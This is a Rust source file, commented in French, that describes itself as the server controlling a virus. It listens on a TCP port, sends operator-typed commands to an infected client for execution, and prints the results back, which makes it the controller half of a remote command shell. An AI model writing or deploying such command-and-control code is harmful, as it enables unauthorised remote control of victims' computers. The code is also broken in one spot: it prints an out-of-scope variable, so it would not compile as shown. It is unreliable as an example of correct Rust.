//! Ce fichier contient le code source du serveur qui controle le virus, permettant de lui envoyer des commandes.
//!
//! Son fonctionnement se résume de la manière suivante: Il récupère d'abord une entrée d'utilisateur, la découpe et l'envoie au client, qui l'executeras ensuite.
//!Finalement, elle récupère l'output et l'affiche à l'utilisateur.

use std::net::{TcpStream};
use std::net::TcpListener;
use std::time::Duration;
use std::thread::sleep;
use std::io::{Write, Read, stdin};


///Cette fonction récupère l'entrée console
///
///Elle renvoie un string contenant la chaine de caracteres rentrés par l'utilisateur, avec les caracteres fonctionnels tel que le retour à la ligne supprimés
pub fn get_entry() -> String {
    let mut buf = String::new();

    stdin().read_line(&mut buf).expect("Impossible de lire la console...");
    buf.replace("\n", "").replace("\r", "")
}


///Cette fonction envoie un message au client.
///
///Elle récupère une entrée console de l'utilisateur grace à la fonction "get_entry()" avant de l'envoyé au client via un processus TCP.
///Elle récupère ensuite l réponse de l'utilisateur et l'affiche dans la console.
pub fn send_message(mut stream: TcpStream) {
    let stdout = std::io::stdout();
    let mut io = stdout.lock();
    let mut buf = [0 as u8; 128];
    let time = 0;

    loop {
        write!(io, "> ").expect("L'interface console à échoué...");
        io.flush().expect("flush impossible...");
        match &*get_entry() {
            "quit" => {
                println!("Au revoir!");
                return;
            }
            line => {
                write!(stream, "{}\n", line).expect("L'envoie de message au serveur à échoué...");
                match stream.read(&mut buf) {
                    Ok(received) => {
                        if received < 1 {
                            println!("Perdu la connexion au serveur");
                            return;
                        }
                    }
                    Err(_) => {
                        println!("Perdu la connexion au serveur");
                        return;
                    }
                }
                println!("Réponse du serveur : {:?}", std::str::from_utf8(&buf).unwrap().to_string());
            }
        }
        sleep(Duration::new(0,time));
    }
}

///Cette fonction établie la connection au serveur.
pub fn launch_server() {
    let listener = TcpListener::bind("192.168.122.1:1234").unwrap();

    println!("En attente d'un client...");
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let adress = match stream.peer_addr() {
                    Ok(adr) => format!("[adresse : {}]", adr),
                    Err(_) => "inconnue".to_owned()
                };

                println!("Client connecté: {}", adr);
                send_message(stream);
            }
            Err(e) => {
                println!("La connexion à échoué : {}", e);
            }
        }
    }
}

fn main() {
    launch_server();
}